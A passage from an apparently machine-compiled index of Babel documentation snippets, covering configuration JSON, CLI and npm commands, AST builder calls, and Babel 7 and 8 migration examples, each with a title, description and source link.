exports a default function named `two`. The example is used to illustrate the differences in how Node.js and other tools handle CommonJS interop.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-04-29-7.14.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport default function two() {\n  return 2;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Preset ES2017\nDESCRIPTION: This JSON configuration shows how to include the @babel/preset-es2017 preset within a babel.config.json file.  It defines a 'presets' array, which includes the preset. This is the recommended way to configure Babel.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-es2017.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-es2017\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Recast Integration Configuration JSON\nDESCRIPTION: Illustrates how to integrate Recast with Babel by specifying Recast as both the parser and generator. This enables preserving the original code formatting during transformations, which is useful for codemods.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_6\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"parserOpts\": {\n    \"parser\": \"recast\"\n  },\n  \"generatorOpts\": {\n    \"generator\": \"recast\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript Infer Operator Constraints Example\nDESCRIPTION: This TypeScript code demonstrates constraints for the `infer` operator in conditional types, a feature of TypeScript 4.7.  It defines a `GetColor` type that infers the `color` property of an object, but only if it extends the string literal types 'red' or 'pink'.  Otherwise it defaults to 'unknown color'. No specific dependencies are needed.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2022-05-19-7.18.0.md#_snippet_3\n\nLANGUAGE: TypeScript\nCODE:\n```\ntype GetColor<T> =\n    T extends { color: infer C extends \"red\" | \"pink\" }\n      ? C\n      : \"unknown color\";\n```\n\n----------------------------------------\n\nTITLE: Parsing Code with babel-parser (Before)\nDESCRIPTION: This code snippet displays the old method of parsing code using `babel-parser` with the catch-all `*` plugin option. This option has been removed in newer versions, requiring explicit specification of plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabelParser.parse(code, {\n  plugins: [\"*\"],\n});\n```\n\n----------------------------------------\n\nTITLE: TSConstructSignatureDeclaration AST (Babel 8)\nDESCRIPTION: Babel 8 AST for TSConstructSignatureDeclaration, using `params` and `returnType`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_16\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSConstructSignatureDeclaration\",\n  \"params\": [\n    { \"type\": \"Identifier\", \"name\": \"x\", \"typeAnnotation\": { \"type\": \"TSNumberKeyword\" } }\n  ],\n  \"retutnType\": {\n    \"type\": \"TSTypeAnnotation\",\n    \"typeAnnotation\": { \"type\": \"TSStringKeyword\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Sprockets-BumbleD in Rails\nDESCRIPTION: This code snippet demonstrates how to configure Sprockets-BumbleD in a Rails application. It extends the Sprockets::BumbleD::DSL and configures the babel config version. Requires the sprockets-bumble_d gem.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/sprockets/usage.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nextend Sprockets::BumbleD::DSL\n\nconfigure_sprockets_bumble_d do |config|\n  config.babel_config_version = 1\nend\n```\n\n----------------------------------------\n\nTITLE: output.js v7 file example\nDESCRIPTION: Shows the output of input.js file being processed by Babel v7. Note that Babel v7 outputs the exact same as the input.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\n// output.js v7\nthis;\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Rest Type\nDESCRIPTION: Creates a TypeScript rest type node in the AST. Represents a rest type parameter, denoted by `...`. Requires the type annotation for the rest parameter.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_203\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsRestType(typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: TSImportType TypeParameters Renaming (TypeScript)\nDESCRIPTION: Illustrates the renaming of `typeParameters` to `typeArguments` in TSImportType.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_38\n\nLANGUAGE: typescript\nCODE:\n```\nvar arr: import(\"./Array\")<string>\n```\n\n----------------------------------------\n\nTITLE: @babel/template Code Placeholder Example JavaScript\nDESCRIPTION: Demonstrates the new code placeholder syntax `%%placeholder_name%%` in `@babel/template`, allowing replacement of any node in a template. This provides greater flexibility and avoids limitations of the previous uppercase identifier placeholder approach. Requires `@babel/template`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst buildLazyFn = template`\n  function %%name%%(%%params%%) {\n    return function () %%body%%;\n  }\n`;\n\nconst result = buildLazyFn({\n  name: functionName,\n  params: functionParams,\n  body: functionBody,\n});\n```\n\n----------------------------------------\n\nTITLE: Ignoring node_modules with @babel/register\nDESCRIPTION: This example shows how to override the default behavior of @babel/register to ignore the `node_modules` directory. It passes an empty array to the `ignore` option, which disables the default ignoring of `node_modules`.\nSOURCE: https://github.com/babel/website/blob/main/docs/register.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/register\")({\n  // This will override `node_modules` ignoring - you can alternatively pass\n  // an array of strings to be explicitly matched or a regex / glob\n  ignore: [],\n});\n```\n\n----------------------------------------\n\nTITLE: Using the plugin via CLI\nDESCRIPTION: Demonstrates how to use the @babel/plugin-syntax-logical-assignment-operators plugin via the Babel CLI. This command processes the script.js file with the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-logical-assignment-operators.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-logical-assignment-operators script.js\n```\n\n----------------------------------------\n\nTITLE: Output JavaScript after transformation\nDESCRIPTION: This is the output JavaScript code after the `@babel/plugin-proposal-import-defer` plugin has transformed the input code. It shows the deferred `require()` call implementation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-defer.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n\"use strict\";\n\nfunction lib(data) {\n  lib = () => data;\n  return data = _interopRequireWildcard(require(\"lib\"));\n}\n\nlater(() => {\n  console.log(lib().value);\n});\n```\n\n----------------------------------------\n\nTITLE: Creating New Expression in JavaScript\nDESCRIPTION: This snippet demonstrates how to create a `NewExpression` AST node using Babel's `t.newExpression` builder. The `callee` parameter can be an `Expression`, `Super`, or `V8IntrinsicIdentifier`. The `arguments` parameter is an array of `Expression`, `SpreadElement`, or `ArgumentPlaceholder` nodes. `optional`, `typeArguments`, and `typeParameters` are optional parameters.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_114\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.newExpression(callee, arguments);\n```\n\n----------------------------------------\n\nTITLE: Creating Module Loader Sandbox JavaScript\nDESCRIPTION: This snippet shows how to create a new module loader with custom global scope. It creates a new Loader instance with a modified `window` object.  It executes code within the isolated sandbox. It requires a `fixup` function (not shown).\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_18\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Create execution sandboxes – new Loaders\nvar loader = new Loader({\n  global: fixup(window) // replace ‘console.log’\n});\nloader.eval(\"console.log(\\\"hello world!\\\");\");\n```\n\n----------------------------------------\n\nTITLE: Globals Configuration JSON\nDESCRIPTION: This JSON snippet defines the globals configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_6\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"globals\": {\n    \"foo-bar\": \"fooBAR\",\n    \"./mylib/foo-bar\": \"mylib.fooBar\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Deferred Import Evaluation in Babel 8\nDESCRIPTION: Presents an example of deferred import evaluation in Babel 8. This allows delaying the execution of import statements until they are actually needed.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nimport defer * as ns from \"dep\";\n```\n\n----------------------------------------\n\nTITLE: Export Namespace From (JavaScript)\nDESCRIPTION: This snippet showcases the usage of `@babel/plugin-proposal-export-namespace-from`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_23\n\nLANGUAGE: javascript\nCODE:\n```\nexport * as ns from \"mod\";\n```\n\n----------------------------------------\n\nTITLE: Globals Member Expression JSON\nDESCRIPTION: This JSON configuration demonstrates how to specify a member expression in globals.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_7\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"globals\": {\n    \"fizzbuzz\": \"fizz.buzz\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage Shell\nDESCRIPTION: Command to use the Babel CLI to transform a JavaScript file using the @babel/plugin-proposal-function-bind plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-bind.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-proposal-function-bind script.js\n```\n\n----------------------------------------\n\nTITLE: Creating Interpreter Directive in JavaScript\nDESCRIPTION: This snippet shows how to create an `InterpreterDirective` AST node using Babel's `t.interpreterDirective` builder. The `value` parameter is a string that represents the interpreter directive.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_91\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.interpreterDirective(value);\n```\n\n----------------------------------------\n\nTITLE: Transform RegExp Disable 'im' Modifiers in Babel\nDESCRIPTION: Transforms a regular expression with modifiers disabled, such as 'im' (case-insensitive and multiline).\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-modifiers.md#_snippet_4\n\nLANGUAGE: js\nCODE:\n```\n// matches Aa, aa, A\\naa, etc. but not A\\na\nconst regex = /^a(?-im:a)/im\n```\n\n----------------------------------------\n\nTITLE: Creating a DeclareClass AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.declareClass` to create a declare class node in the AST.  It represents a class declaration in Flow type annotations. Parameters include the identifier, type parameters, extended interfaces, and object type annotation for the body.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_33\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.declareClass(id, typeParameters, extends, body);\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage\nDESCRIPTION: Shows how to use the plugin via the Babel CLI.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-proto-to-assign.md#_snippet_6\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-proto-to-assign script.js\n```\n\n----------------------------------------\n\nTITLE: Exported Const Enum Input\nDESCRIPTION: Input TypeScript code showing a const enum being exported.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_11\n\nLANGUAGE: typescript\nCODE:\n```\n// Input\nexport const enum Animals {\n  Fish,\n}\n```\n\n----------------------------------------\n\nTITLE: Create TypeScript Non-Null Expression\nDESCRIPTION: Creates a TypeScript non-null expression node in the AST. Represents the `!` operator in TypeScript, which asserts that a value is not null or undefined. Requires the expression being asserted as non-null.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_194\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsNonNullExpression(expression);\n```\n\n----------------------------------------\n\nTITLE: Stricter Preset Option Parsing (Diff)\nDESCRIPTION: This snippet illustrates the stricter option parsing in Babel 7. Comma-separated lists for presets, which technically worked in Babel 6, now require array syntax. This change enforces a more consistent and predictable configuration structure.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_10\n\nLANGUAGE: diff\nCODE:\n```\n{\n-  \"presets\": \"@babel/preset-env, @babel/preset-react\"\n+  \"presets\": [\"@babel/preset-env\", \"@babel/preset-react\"]\n}\n```\n\n----------------------------------------\n\nTITLE: For-of Loop in JavaScript\nDESCRIPTION: This JavaScript code demonstrates a `for...of` loop iterating over an array to access its elements.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet elm;\nfor (elm of array) {\n  console.log(elm);\n}\n```\n\n----------------------------------------\n\nTITLE: Consolidating var declarations in destructuring transform (JavaScript)\nDESCRIPTION: This code snippet demonstrates how contiguous var declarations are consolidated during destructuring transform. The input `const` destructuring is transformed to a `var` declaration with multiple variables.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\n// in\nconst [a, b] = [1, 2];\n// out\nvar a = 1,\n    b = 2;\n```\n\n----------------------------------------\n\nTITLE: Configure plugin in babel.config.json (no options)\nDESCRIPTION: Demonstrates how to enable the @babel/plugin-transform-react-jsx-development plugin in a babel.config.json file without specifying any options.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-development.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-react-jsx-development\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Defining React Component using ES6 Classes\nDESCRIPTION: Demonstrates defining a React component using the ES6 class syntax, extending React.Component and defining the render method.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nclass Photo extends React.Component {\n  render() {\n    return <img alt={this.props.caption} src={this.props.src} />;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Update @babel/preset-env includes configuration - JSON\nDESCRIPTION: This code snippet shows how to update the `includes` configuration option in `@babel/preset-env` when renaming packages. It involves modifying the `babel.config.json` file to use the new package name.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [[\n    \"@babel/preset-env\",\n    {\n      \"includes\": [\"transform-optional-chaining\"]\n    }\n  ]]\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript let/const Block Scoping Example - JavaScript\nDESCRIPTION: This JavaScript code demonstrates a scenario where a closure is typically required to correctly transform `let` declarations within a loop.  Each iteration of the loop captures the current value of `i` in a closure, ensuring that the `setTimeout` callback logs the correct value.  If `throwIfClosureRequired` is enabled in Babel, this code would throw an error during transformation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nfor (let i = 0; i < 5; i++) {\n  setTimeout(() => console.log(i), 1);\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming Async Generator Functions JavaScript\nDESCRIPTION: Demonstrates the transformation of an async generator function using Babel. The code defines an async function* called agf which awaits a value and yields another.  This showcases the async iteration proposal implementation in Babel.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-09-28-6.16.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nasync function* agf() {\n  await 1;\n  yield 2;\n}\n```\n\n----------------------------------------\n\nTITLE: TSMappedType Signature Change in TypeScript\nDESCRIPTION: This TypeScript code shows the changes in the signature of `t.tsMappedType` between Babel 7 and Babel 8.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_61\n\nLANGUAGE: typescript\nCODE:\n```\n// Babel 7\ndeclare function tsMappedType(\n  typeParameter: TSTypeParameter,\n  typeAnnotation?: TSType,\n  nameType?: TSType\n): TSMappedType\n\n// Babel 8\ndeclare function tsMappedType(\n  key: Identifier,\n  constraint: TSType,\n  nameType?: TSType,\n  typeAnnotation?: TSType\n): TSMappedType\n```\n\n----------------------------------------\n\nTITLE: Class Compilation Output (Diff)\nDESCRIPTION: This diff shows the compiled output of the class `A` when the `loose` option is not enabled. The `_classCallCheck` helper is included in the compiled output.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_5\n\nLANGUAGE: Diff\nCODE:\n```\nvar A = function A() {\n-  _classCallCheck(this, A);\n};\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTupleType Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TSTupleType` AST node using Babel's `t.tsTupleType` method. It takes an array of `TSType` or `TSNamedTupleMember` as an argument to represent the element types within the tuple.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_209\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTupleType(elementTypes);\n```\n\n----------------------------------------\n\nTITLE: Allow Mutable Props Config (JSON)\nDESCRIPTION: Illustrates how to configure the `allowMutablePropsOnTags` option in babel.config.json to permit object properties on specific elements. This skips the `Mutable Properties` deopt for the specified elements, such as 'FormattedMessage'.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-constant-elements.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-transform-react-constant-elements\",\n      { \"allowMutablePropsOnTags\": [\"FormattedMessage\"] }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Checking for Object and Class Properties in JavaScript\nDESCRIPTION: This snippet uses `t.isProperty(node)` to verify if an AST node is a property. It covers `ClassAccessorProperty`, `ClassPrivateProperty`, `ClassProperty`, and `ObjectProperty` nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_289\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isProperty(node);\n```\n\n----------------------------------------\n\nTITLE: Method Extraction with DOM event (ES6)\nDESCRIPTION: This JavaScript (ES6) snippet demonstrates binding a method to a DOM event using the `.bind` method. It binds the `view.reset` method to a click event on elements with the class 'some-link'.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-05-14-function-bind.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n$(\".some-link\").on(\"click\", view.reset.bind(view));\n```\n\n----------------------------------------\n\nTITLE: Using TSImportType with typeArguments (TS)\nDESCRIPTION: Illustrates the AST for TSImportType with type arguments in Babel 7 and Babel 8. The `typeParameters` property is renamed to `typeArguments`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_51\n\nLANGUAGE: typescript\nCODE:\n```\nparams: [{\n          type: \"TSStringKeyword\"\n        }]\n      }\n    }\n\n    // AST in Babel 8\n    {\n      type: \"TSImportType\",\n      argument: {\n        type: \"TSLiteralType\",\n        literal: StringLiteral(\"./Array\")\n      },\n      typeArguments: {\n        type: \"TSTypeParameterInstantiation\",\n        params: [{\n          type: \"TSStringKeyword\"\n        }]\n      }\n    }\n    \n```\n\n----------------------------------------\n\nTITLE: output.js v6 file example\nDESCRIPTION: Shows the output of input.js file being processed by Babel v6. Note that Babel v6 automatically injects 'use strict' and changes this to undefined.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\n// output.js v6\n\"use strict\"; // assumed strict modules\nundefined; // changed this to undefined\n```\n\n----------------------------------------\n\nTITLE: Creating a TS Array Type Node in Babel\nDESCRIPTION: Creates a `TSArrayType` AST node using the Babel types module. This node represents an array type in TypeScript, requiring an element type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_159\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsArrayType(elementType);\n```\n\n----------------------------------------\n\nTITLE: JavaScript Example: Numeric Literal Conversion\nDESCRIPTION: Demonstrates how the plugin converts an array of integers to exponential notation to reduce code size.  The input is an array containing 1000 and -20000. The expected output is the equivalent array with the numbers represented as 1e3 and -2e4, respectively.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-numeric-literals.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n[1000, -20000]\n```\n\n----------------------------------------\n\nTITLE: Removing Unnecessary Babel Plugins\nDESCRIPTION: This code block demonstrates the removal of specific Babel plugins for optional chaining and nullish coalescing, as these features are now supported by default in `@babel/preset-env`. The diff highlights the lines to remove from a Babel configuration file.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-01-11-7.8.0.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/env\", { \"targets\": [\"last 2 versions\"] }]\n  ],\n  \"plugins\": [\n-   \"@babel/proposal-optional-chaining\",\n-   \"@babel/proposal-nullish-coalescing-operator\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Minify Booleans Transformation Example JavaScript\nDESCRIPTION: Demonstrates the transformation performed by babel-plugin-transform-minify-booleans. It converts `true` to `!0` and `false` to `!1`.\nNo dependencies are required. Input: JavaScript boolean literals. Output: Minified boolean literals.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-minify-booleans.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\ntrue;\nfalse;\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n!0;\n!1;\n```\n\n----------------------------------------\n\nTITLE: Source of babel-preset-stage-0 (JavaScript)\nDESCRIPTION: This JavaScript code shows the source of the `babel-preset-stage-0` in Babel v6. It demonstrates how the stage preset imports other stage presets and includes specific plugins for transformations. It requires 'babel-preset-stage-1', 'babel-plugin-transform-do-expressions', and 'babel-plugin-transform-function-bind'.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-07-27-removing-babels-stage-presets.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  presets: [\n    require(\"babel-preset-stage-1\")\n  ],\n  plugins: [\n    require(\"babel-plugin-transform-do-expressions\"),\n    require(\"babel-plugin-transform-function-bind\")\n  ]\n};\n```\n\n----------------------------------------\n\nTITLE: Creating an ObjectTypeSpreadProperty in JavaScript\nDESCRIPTION: This code snippet demonstrates creating an `ObjectTypeSpreadProperty` AST node using `t.objectTypeSpreadProperty(argument)`. It represents a spread property within a Flow object type annotation. The `argument` parameter represents the `FlowType` being spread.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_131\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.objectTypeSpreadProperty(argument);\n```\n\n----------------------------------------\n\nTITLE: Virtual Methods with Function Bind (ES6)\nDESCRIPTION: This JavaScript (ES6) snippet demonstrates the use of .call to achieve the same effect as the ES7 function bind syntax. It chains `map`, `takeWhile`, and `forEach` functions to process data retrieved by `getPlayers()`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-05-14-function-bind.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { map, takeWhile, forEach } from \"iterlib\";\n\nlet _val;\n_val = getPlayers();\n_val = map.call(_val, x => x.character());\n_val = takeWhile.call(_val, x => x.strength > 100);\n_val = forEach.call(_val, x => console.log(x));\n```\n\n----------------------------------------\n\nTITLE: Configuring transform-es2015-block-scoping with throwIfClosureRequired - JSON\nDESCRIPTION: This JSON configuration enables the `throwIfClosureRequired` option for the `transform-es2015-block-scoping` plugin. When set to `true`, Babel will throw an error if it encounters code that requires a closure to correctly transform `let` or `const` declarations within loops. This is useful for performance-sensitive code where the overhead of closures is undesirable.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\"transform-es2015-block-scoping\", {\n      \"throwIfClosureRequired\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TypeAlias with Babel\nDESCRIPTION: Creates a `TypeAlias` AST node using the `t.typeAlias` method. This node represents a type alias in Flow, where `id` is an `Identifier` node for the alias name, `typeParameters` is a `TypeParameterDeclaration` node (optional), and `right` is a `FlowType` node defining the type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_235\n\nLANGUAGE: javascript\nCODE:\n```\nt.typeAlias(id, typeParameters, right);\n```\n\n----------------------------------------\n\nTITLE: Transforming Literals Example JavaScript\nDESCRIPTION: This JavaScript code demonstrates the transformation performed by the `@babel/plugin-transform-literals` plugin. It converts binary and octal integer literals, as well as unicode string literals representing newline and tab characters, into their equivalent representations. No dependencies are required. Input: Binary, octal, and unicode literals. Output: Equivalent decimal, octal, and string literals.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-literals.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar b = 0b11; // binary integer literal\nvar o = 0o7; // octal integer literal\nconst u = \"Hello\\u{000A}\\u{0009}!\"; // unicode string literals, newline and tab\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar b = 3; // binary integer literal\nvar o = 7; // octal integer literal\nconst u = \"Hello\\n\\t!\"; // unicode string literals, newline and tab\n```\n\n----------------------------------------\n\nTITLE: Object Rest Destructuring: Input JavaScript\nDESCRIPTION: This JavaScript code demonstrates object rest destructuring assignment.  It is an example input meant to be transformed by the babel plugin using the `useBuiltIns` option.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-destructuring.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar { ...x } = z;\n```\n\n----------------------------------------\n\nTITLE: Closure Required Example JavaScript\nDESCRIPTION: Shows an example where block scoping transformation may require a closure.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoping.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nfor (let i = 0; i < 5; i++) {\n  setTimeout(() => console.log(i), 1);\n}\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/helper-hoist-variables\nDESCRIPTION: Installation command using npm to install the @babel/helper-hoist-variables package as a project dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-hoist-variables.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install @babel/helper-hoist-variables --save\n```\n\n----------------------------------------\n\nTITLE: ES5 Component Lifecycle with componentWillMount\nDESCRIPTION: Shows the ES5 approach to using the componentWillMount lifecycle method in a React component.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-07-07-react-on-es6-plus.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n// The ES5 way\nvar EmbedModal = React.createClass({\n  componentWillMount: function() { … },\n});\n```\n\n----------------------------------------\n\nTITLE: Plugin Usage via CLI (Shell)\nDESCRIPTION: This command shows how to use the `@babel/plugin-transform-regenerator` plugin via the Babel CLI.  It specifies the plugin to use and the input file to transform.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regenerator.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-regenerator script.js\n```\n\n----------------------------------------\n\nTITLE: Preventing Multiple Return Statements in Loops with `transform-do-expressions` - JavaScript\nDESCRIPTION: This code illustrates a fix in the `transform-do-expressions` plugin that prevents multiple `return` statements from being generated within loops.  The transformation ensures that the `do` expression is correctly converted into a function with a single return statement at the end, preventing potential errors and unexpected behavior.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nlet p\nlet a = do {\n  while (p = p.parentPath) {\n    if (a) {\n      'a'\n    } else {\n      'b'\n    }\n  }\n};\n```\n\nLANGUAGE: javascript\nCODE:\n```\nlet p;\nlet a = function () {\n  var _ret;\n\n  while (p = p.parentPath) {\n    if (a) {\n      _ret = 'a';\n    } else {\n      _ret = 'b';\n    }\n  }\n  return _ret; // previously had an extra return\n}();\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm or yarn\nDESCRIPTION: This command installs the @babel/plugin-syntax-import-reflection plugin as a development dependency using npm or yarn. This installation is required before the plugin can be used in a Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-reflection.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-import-reflection\n```\n\n----------------------------------------\n\nTITLE: Unsupported Property of Strings with u Flag (JavaScript)\nDESCRIPTION: This code snippet demonstrates that using properties of strings with the `u` flag will result in an error, as they are only supported with the `v` flag.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-sets-regex.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n// highlight-error-next-line\n/\\p{Emoji_Keycap_Sequence}/u;\n// Error: Properties of strings are only supported when using the unicodeSets (v) flag.\n```\n\n----------------------------------------\n\nTITLE: Creating a Directive AST Node in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of `t.directive` to create a directive node in the AST. It takes a DirectiveLiteral representing the directive's value.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_45\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.directive(value);\n```\n\n----------------------------------------\n\nTITLE: Run Babel with Plugin via CLI\nDESCRIPTION: Executes the Babel CLI with the `@babel/plugin-syntax-destructuring-private` plugin specified.  This allows processing of files (e.g., `script.js`) that contain destructuring private fields.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-destructuring-private.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-destructuring-private script.js\n```\n\n----------------------------------------\n\nTITLE: Using @babel/preset-stage-0 with babel.config.json\nDESCRIPTION: Configures Babel to use the @babel/preset-stage-0 preset via the babel.config.json file. This is the recommended approach for configuring Babel presets.\nSOURCE: 